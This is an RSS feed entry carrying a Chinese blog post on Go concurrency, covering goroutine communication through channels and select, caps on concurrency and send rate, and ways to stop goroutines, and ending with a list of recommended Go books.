<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Theoyu&#39;s Blog</title>
		<link>https://theoyu.top/posts/</link>
		<description>Recent content in Posts on Theoyu&#39;s Blog</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Thu, 02 Dec 2021 23:30:20 +0800</lastBuildDate>
		<atom:link href="https://theoyu.top/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>go并发的几个问题</title>
			<link>https://theoyu.top/posts/concurrent-in-go/</link>
			<pubDate>Thu, 02 Dec 2021 23:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/concurrent-in-go/</guid>
			<description>前言 作为世界上除了PHP之外最好的语言golang，只需go关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。
如何控制协程的通信 引入全局变量 这是最简单也是最容易想到的方法：虽然goroutine的退出只能由其自身的决定，不允许从外部直接控制，不过我们可以通过引入全局变量，所有的goroutine都共享这个变量，并且不断寻查其是否更新，在主程序中对其更改，goroutine勘测到其变化后做出反应。
package main import ( &amp;#34;fmt&amp;#34; &amp;#34;time&amp;#34; ) var running bool func run() { for running { fmt.Println(&amp;#34;running&amp;#34;) time.Sleep(500*time.Millisecond) } fmt.Println(&amp;#34;stop now&amp;#34;) } func main(){ running=true go run() go run() time.Sleep(time.Second) running=false time.Sleep(time.Second) } /* out: running running running running stop now stop now */ 这种写法看似很简单，但是还是有好几个问题：
 全局变量存在数据同步问题，如果有多个写入需要加锁处理。 协程之间的通信量很小，只有事先定义的全局变量，并且只能单向从主程序通知给协程。  利用channel通信 相信写go的兄弟，一定对这一句话不陌生：
 Go语言的并发模型是CSP（Communicating Sequential Processes）通信顺序进程，提倡通过通信共享内存而不是通过共享内存而实现通信。
 这里简单谈谈我的理解:
共享内存是什么?如果在一个系统中，不同进程或者线程共享一块内存，那么他们之间不需要进行平凡的交互，如果有大量的数据传输，也省去了数据拷贝的消耗。
但是这有一个很大的问题，就是多线程下，共享一块内存，肯定会存在数据冲突。为了对抗这种冲突，人们发明了很多机制，比如加锁，信号量，各种调度算法等等，但是这毫无都会对并发的性能造成影响。(但并不是说全部都不行，比如深度 | 字节跳动微服务架构体系演进）
最终“通过通信来实现进程/线程间交互”的方案脱颖而出,go就在语言层提供了channel来实现这一方案，简单理解就是设计的时候，对于消息队列，只提供读写接口，而对于内部的实现你完全不用去在意，看起来消息队列就像是共享内存一样了。然而你的消息队列可以利用socket进行通信。
通过看channel的源码，可以看出它其实就是一个队列加一个轻量锁
type hchan struct { qcount uint // total data in the queue  dataqsiz uint // size of the circular queue  buf unsafe.</description>
			<content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>作为世界上除了PHP之外最好的语言golang，只需<code>go</code>关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。</p>
<h2 id="如何控制协程的通信">如何控制协程的通信</h2>
<h3 id="引入全局变量">引入全局变量</h3>
<p>这是最简单也是最容易想到的方法：虽然goroutine的退出只能由其自身的决定，不允许从外部直接控制，不过我们可以通过引入全局变量，所有的goroutine都共享这个变量，并且不断寻查其是否更新，在主程序中对其更改，goroutine勘测到其变化后做出反应。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;time&#34;</span>
<span class="p">)</span>
<span class="kd">var</span> <span class="nx">running</span> <span class="kt">bool</span>
<span class="kd">func</span> <span class="nf">run</span><span class="p">()</span>  <span class="p">{</span>
	<span class="k">for</span> <span class="nx">running</span>  <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;running&#34;</span><span class="p">)</span>
		<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">500</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;stop now&#34;</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">(){</span>
	<span class="nx">running</span><span class="p">=</span><span class="kc">true</span>
	<span class="k">go</span> <span class="nf">run</span><span class="p">()</span>
	<span class="k">go</span> <span class="nf">run</span><span class="p">()</span>
	<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
	<span class="nx">running</span><span class="p">=</span><span class="kc">false</span>
	<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
<span class="p">}</span>

<span class="cm">/*
</span><span class="cm">out:
</span><span class="cm">running
</span><span class="cm">running
</span><span class="cm">running
</span><span class="cm">running
</span><span class="cm">stop now
</span><span class="cm">stop now
</span><span class="cm">*/</span>
</code></pre></div><p>这种写法看似很简单，但是还是有好几个问题：</p>
<ol>
<li>全局变量存在数据同步问题，如果有多个写入需要加锁处理。</li>
<li>协程之间的通信量很小，只有事先定义的全局变量，并且只能单向从主程序通知给协程。</li>
</ol>
<h3 id="利用channel通信">利用channel通信</h3>
<p>相信写go的兄弟，一定对这一句话不陌生：</p>
<blockquote>
<p>Go语言的并发模型是CSP（Communicating Sequential Processes）通信顺序进程，提倡通过通信共享内存而不是通过共享内存而实现通信。</p>
</blockquote>
<p>这里简单谈谈我的理解:</p>
<p>共享内存是什么?如果在一个系统中，不同进程或者线程共享一块内存，那么他们之间不需要进行平凡的交互，如果有大量的数据传输，也省去了数据拷贝的消耗。</p>
<p>但是这有一个很大的问题，就是多线程下，共享一块内存，肯定会存在数据冲突。为了对抗这种冲突，人们发明了很多机制，比如加锁，信号量，各种调度算法等等，但是这毫无都会对并发的性能造成影响。(但并不是说全部都不行，比如<a href="https://zhuanlan.zhihu.com/p/382833278">深度 | 字节跳动微服务架构体系演进</a>）</p>
<p>最终“通过通信来实现进程/线程间交互”的方案脱颖而出,go就在语言层提供了channel来实现这一方案，简单理解就是设计的时候，对于消息队列，只提供读写接口，而对于内部的实现你完全不用去在意，看起来消息队列就像是共享内存一样了。然而你的消息队列可以利用socket进行通信。</p>
<p>通过看channel的源码，可以看出它其实就是一个队列加一个轻量锁</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">hchan</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">qcount</span>   <span class="kt">uint</span>           <span class="c1">// total data in the queue
</span><span class="c1"></span>   <span class="nx">dataqsiz</span> <span class="kt">uint</span>           <span class="c1">// size of the circular queue
</span><span class="c1"></span>   <span class="nx">buf</span>      <span class="nx">unsafe</span><span class="p">.</span><span class="nx">Pointer</span> <span class="c1">// points to an array of dataqsiz elements
</span><span class="c1"></span>   <span class="nx">elemsize</span> <span class="kt">uint16</span>
   <span class="nx">closed</span>   <span class="kt">uint32</span>
   <span class="nx">elemtype</span> <span class="o">*</span><span class="nx">_type</span> <span class="c1">// element type
</span><span class="c1"></span>   <span class="nx">sendx</span>    <span class="kt">uint</span>   <span class="c1">// send index
</span><span class="c1"></span>   <span class="nx">recvx</span>    <span class="kt">uint</span>   <span class="c1">// receive index
</span><span class="c1"></span>   <span class="nx">recvq</span>    <span class="nx">waitq</span>  <span class="c1">// list of recv waiters
</span><span class="c1"></span>   <span class="nx">sendq</span>    <span class="nx">waitq</span>  <span class="c1">// list of send waiters
</span><span class="c1"></span>
   <span class="c1">// lock protects all fields in hchan, as well as several
</span><span class="c1"></span>   <span class="c1">// fields in sudogs blocked on this channel.
</span><span class="c1"></span>   <span class="c1">//
</span><span class="c1"></span>   <span class="c1">// Do not change another G&#39;s status while holding this lock
</span><span class="c1"></span>   <span class="c1">// (in particular, do not ready a G), as this can deadlock
</span><span class="c1"></span>   <span class="c1">// with stack shrinking.
</span><span class="c1"></span>   <span class="nx">lock</span> <span class="nx">mutex</span>
<span class="p">}</span>
</code></pre></div><p>再谈谈select机制，可以理解为select, poll, epoll 相似的功能：监听多个描述符的读/写等事件，属于基于事件的并发处理(欸好像和之前看csapp第12章的知识连起来了)，简单来说就是监听多个channel，每一个case都是一个事件，按照先后(如果相同则随机)执行，如果没监听的事件暂时堵塞则会执行default。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">output1</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">string</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">write</span><span class="p">(</span><span class="nx">output1</span><span class="p">)</span>
   <span class="k">for</span> <span class="nx">s</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">output1</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;res:&#34;</span><span class="p">,</span> <span class="nx">s</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">write</span><span class="p">(</span><span class="nx">ch</span> <span class="kd">chan</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="nx">ch</span> <span class="o">&lt;-</span> <span class="s">&#34;hello&#34;</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;write hello&#34;</span><span class="p">)</span>
      <span class="k">default</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;channel full&#34;</span><span class="p">)</span>
      <span class="p">}</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span> <span class="o">*</span> <span class="mi">500</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*
</span><span class="cm">write hello
</span><span class="cm">res: hello
</span><span class="cm">write hello
</span><span class="cm">write hello
</span><span class="cm">write hello
</span><span class="cm">res: hello
</span><span class="cm">write hello
</span><span class="cm">write hello
</span><span class="cm">write hello
</span><span class="cm">channel full
</span><span class="cm">......
</span><span class="cm">*/</span>
</code></pre></div><h2 id="控制并发量">控制并发量</h2>
<p>准备写这里的时候，在知乎上看到一个老哥说可以通过<code>runtime.GOMAXPROCS(n)</code>直接修改最大线程数&hellip;</p>
<p>这是对并发和并行没有弄清楚</p>
<pre><code>多线程程序在一个核的cpu上运行，就是并发。
多线程程序在多个核的cpu上运行，就是并行。
</code></pre><p>当一个函数创建为goroutine时，编译器会将其视为一个独立的工作单元。这个单元会被调度到<strong>可用的逻辑处理器</strong>（可用的核数）上执行。线程是和逻辑处理器绑定的。而<code>runtime.GOMAXPROCS(n)</code>就是分配n个逻辑处理器。但我们这里谈并发，还是在一个偏<del>微观</del>的层面，可以说这个回答是毫无相关了。</p>
<p>我们首先看看过高的并发会导致什么问题：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;math&#34;</span>
	<span class="s">&#34;sync&#34;</span>
	<span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
	<span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nx">math</span><span class="p">.</span><span class="nx">MaxInt32</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
		<span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">i</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">defer</span> <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
			<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
		<span class="p">}(</span><span class="nx">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></div><pre><code>panic: too many concurrent operations on a single file or socket (max 1048575)

goroutine 1127972 [running]:
internal/poll.(*fdMutex).rwlock(0xc000110280, 0x113500, 0x7600000001)
        D:/go/src/internal/poll/fd_mutex.go:147 +0x146
internal/poll.(*FD).writeLock(...)
        D:/go/src/internal/poll/fd_mutex.go:239
internal/poll.(*FD).Write(0xc000110280, 0xc17470e5f0, 0x8, 0x8, 0x0, 0x0, 0x0)
</code></pre><p>报错是由<code>fmt.println</code>引起的，对单个 file/socket 的并发操作个数超过了系统上限，那如果我们把<code>fmt.println</code>换成并发安全的<code>log.println</code>呢？</p>
<p>运行后，goland直接退出，chrome浏览器也闪退。每个协程至少需要消耗 2KB 的空间，在骤减的内存空间下，程序运行很容易崩溃，总而言之就是并发的控制不当导致系统的资源被耗尽了。</p>
<p>不同的应用程序对资源的需求是不同的，比如如果是并发对本地资源的操作，那么应该需要考虑系统资源的承受能力；如果是对外端口扫描、密码破解，那还需要考虑会不会触发风控警告等等。总之，并发的上限应该由程序主动控制。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;log&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>
<span class="kd">func</span> <span class="nf">crack</span><span class="p">(</span><span class="nx">taskChan</span> <span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span><span class="nx">wg</span> <span class="o">*</span><span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">){</span>
   <span class="k">for</span> <span class="nx">task</span><span class="o">:=</span><span class="k">range</span> <span class="nx">taskChan</span><span class="p">{</span>
      <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;crack: &#34;</span><span class="p">,</span><span class="nx">task</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
      <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
   <span class="p">}</span>
<span class="p">}</span>
<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
   <span class="nx">threat</span><span class="o">:=</span><span class="mi">10</span>
   <span class="nx">taskChan</span><span class="o">:=</span><span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span><span class="nx">threat</span><span class="p">)</span>
   <span class="k">for</span> <span class="nx">i</span><span class="o">:=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="p">&lt;</span><span class="nx">threat</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">{</span>
      <span class="k">go</span> <span class="nf">crack</span><span class="p">(</span><span class="nx">taskChan</span><span class="p">,</span><span class="o">&amp;</span><span class="nx">wg</span><span class="p">)</span>
   <span class="p">}</span>

   <span class="k">for</span> <span class="nx">i</span><span class="o">:=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="p">&lt;</span><span class="mi">100</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">{</span>
      <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
      <span class="nx">taskChan</span><span class="o">&lt;-</span><span class="nx">i</span>
   <span class="p">}</span>
   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
   <span class="nb">close</span><span class="p">(</span><span class="nx">taskChan</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>上面这个实例很好理解，相当于创建了10个并发的crack消费者，range感知taskChan的变化，再通过一个for依次把目标输送给goroutine。</p>
<p>实际上，除了控制并发之外，有时候我们还需要控制发包的速率，避免过快触发警告，可以利用<code>time.NewTicker(rateLimit)</code>计时器来控制发包</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;log&#34;</span>
	<span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">(){</span>
  <span class="nx">rate</span><span class="o">:=</span><span class="mi">10</span>
  <span class="nx">rateLimit</span><span class="o">:=</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="o">/</span><span class="nx">time</span><span class="p">.</span><span class="nf">Duration</span><span class="p">(</span><span class="nx">rate</span><span class="p">)</span>
  <span class="nx">ticker</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">NewTicker</span><span class="p">(</span><span class="nx">rateLimit</span><span class="p">)</span>
  <span class="nx">worker</span><span class="o">:=</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">{</span>
      <span class="o">&lt;-</span><span class="nx">ticker</span><span class="p">.</span><span class="nx">C</span>
      <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ok&#34;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">go</span> <span class="nf">worker</span><span class="p">()</span>
  <span class="k">go</span> <span class="nf">worker</span><span class="p">()</span>
  <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>但如果在实际工程的时候，需要考虑一些问题。比如如果是多ip的扫描，应该给每个ip分发一个ticker而不是共享，不然对效率会有比较大的损失。</p>
<h2 id="退出协程的几种方式">退出协程的几种方式</h2>
<p>关于协程，我们不仅要关注创建和通信，还要关注如何合理的退出。当然之前说到全局变量的确可以，但是不推荐，以下讲述三种方式退出协程。</p>
<h3 id="for-range退出">for-range退出</h3>
<p>之前说过range可以感知channel的变化，如果协程只从一个channel中读取数据，那么下列的程序即可主动退出协程</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">(){</span>
   <span class="nx">channel</span><span class="o">:=</span><span class="nf">make</span> <span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span>
   <span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">defer</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;exit&#34;</span><span class="p">)</span>
      <span class="k">for</span> <span class="nx">x</span><span class="o">:=</span><span class="k">range</span> <span class="nx">channel</span><span class="p">{</span>
         <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}()</span>

   <span class="k">for</span> <span class="nx">i</span><span class="o">:=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">{</span>
      <span class="nx">channel</span><span class="o">&lt;-</span><span class="nx">i</span>
      <span class="k">if</span> <span class="nx">i</span><span class="o">==</span><span class="mi">5</span><span class="p">{</span>
         <span class="nb">close</span><span class="p">(</span><span class="nx">channel</span><span class="p">)</span>
         <span class="k">break</span>
      <span class="p">}</span>
   <span class="p">}</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><h3 id="select退出">select退出</h3>
<p>上述只是针对单个channel的读取，select的多路复用可以处理多个chanel，但是其并不能感知channel的关闭，会一直读取到0值。因为关闭的channel可以读取，但是写入会引发panic。不过我们可以用<code>,ok</code>来解决这个问题。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">defer</span> <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;exit&#34;</span><span class="p">)</span>
		<span class="k">for</span> <span class="p">{</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="nx">x</span><span class="p">,</span><span class="nx">ok</span><span class="o">:=&lt;-</span><span class="nx">in</span><span class="p">:</span>
				<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
					<span class="k">return</span>
				<span class="p">}</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;continue&#34;</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">other</span><span class="p">:</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;continue&#34;</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}()</span>
</code></pre></div><p>上述的例子只要channel in关闭则会主动退出协程。但还是存在多个channel，如果有指定个channel退出，则退出协程的情况，这里要用到<strong>select不会在nil的通道上进行等待</strong>，所以我们可以把关闭的通道全部设置为nil，在循环底部加上判断即可。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">in1</span><span class="p">:</span>
         <span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
            <span class="nx">in1</span> <span class="p">=</span> <span class="kc">nil</span>
         <span class="p">}</span>
      <span class="k">case</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">in2</span><span class="p">:</span>
         <span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
            <span class="nx">in2</span> <span class="p">=</span> <span class="kc">nil</span>
         <span class="p">}</span>
      <span class="k">if</span> <span class="nx">in1</span> <span class="o">==</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">in2</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
         <span class="k">return</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}()</span>
</code></pre></div><h3 id="使用专门通道退出协程">使用专门通道退出协程</h3>
<p>这里传入了一个专门的channel<code>stopCh</code>,当main函数执行close(stopCh)时，所有协程里的<code>case &lt;-stopCh</code>都会收到信号，进而关闭，这比给stopCh发送多个数据方便多了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">worker</span><span class="p">(</span><span class="nx">stopCh</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span> <span class="p">{</span>
   <span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">defer</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;worker exit&#34;</span><span class="p">)</span>
      <span class="c1">// Using stop channel explicit exit
</span><span class="c1"></span>      <span class="k">for</span> <span class="p">{</span>
         <span class="k">select</span> <span class="p">{</span>
         <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">stopCh</span><span class="p">:</span>
            <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Recv stop signal&#34;</span><span class="p">)</span>
            <span class="k">return</span>
         <span class="k">default</span><span class="p">:</span>
            <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;running&#34;</span><span class="p">)</span>
            <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
         <span class="p">}</span>
      <span class="p">}</span>
   <span class="p">}()</span>
   <span class="k">return</span>
<span class="p">}</span>
<span class="kd">func</span> <span class="nf">main</span><span class="p">(){</span>
   <span class="nx">stopCh</span><span class="o">:=</span><span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
   <span class="k">go</span> <span class="nf">worker</span><span class="p">(</span><span class="nx">stopCh</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">worker</span><span class="p">(</span><span class="nx">stopCh</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">worker</span><span class="p">(</span><span class="nx">stopCh</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">((</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
   <span class="nb">close</span><span class="p">(</span><span class="nx">stopCh</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><h2 id="reference">Reference</h2>
<ul>
<li><a href="https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/channel.html">https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/channel.html</a></li>
<li><a href="https://studygolang.com/articles/16774">https://studygolang.com/articles/16774</a></li>
</ul>
<h2 id="写在最后">写在最后</h2>
<p>说一个很有意思的事情，笔者曾在去年寒假认认真真学了两个月go，原因呢，主要还是想要<del>专精</del>于一门语言吧。c++大一留下了很不好的印象，php动态类型不太能接受，最后选择了golang。学习路线大概是：</p>
<ol>
<li>
<p><a href="https://books.studygolang.com/gopl-zh/">Go语言圣经</a> 这本书的评价相当高，我也首先选择了这本，大概在是异常的时候放弃了，感觉这本书的例子很有高度，但不太适合初学者，更像是有一定经验的gopher日常回味的感觉。</p>
</li>
<li>
<p><a href="https://github.com/unknwon/the-way-to-go_ZH_CN/blob/master/eBook/directory.md">the way to go </a>后来加了一个go语言学习群，在里面有师傅推荐了这一本书，然后就顺着一点一点看，看到并发那一章的时候，卡住了&hellip;可能是思想上没能转变过来，最后无意间搜到了一本非常通俗易懂的书</p>
</li>
<li>
<p><a href="https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E4%BB%8B%E7%BB%8D.html">Go语言中文文档</a> 准确来说这并不是一本书，是一个叫枯藤的go语言爱好者结合前人的资料，总结下来的一份非常全面的文档，后续的学习也基本上是在这个的基础上，不过寒假的学习基本上到gin就结束了，rpc什么的都是后续回学校有的没的看一些。还有收集一些非常好的资料，但是都甚至没能深入看看。</p>
</li>
<li>
<p><a href="https://chai2010.cn/advanced-go-programming-book/">Go语言高级编程</a> 这本书的需要一定的基础，从目录-&gt;<code>CGO</code>,<code>汇编</code>,<code>RPC</code>等等也能看出来</p>
</li>
<li>
<p><a href="https://github.com/astaxie/build-web-application-with-golang">build-web-application-with-golang</a> 主要是web方面，也是评价很高</p>
</li>
<li>
<p><a href="https://draveness.me/golang/">Go 语言设计与实现</a> 刚刚点开的时候发现出书了！！！必须支持！！信仰师傅是某天操作系统课上，骏哥推给我的。如果真要对标一本其他的书的话，这本书在go上的定位可能和《深入了解java虚拟机》在java上一样。(不过我只看了基础知识和编译原理部分)</p>
</li>
</ol>
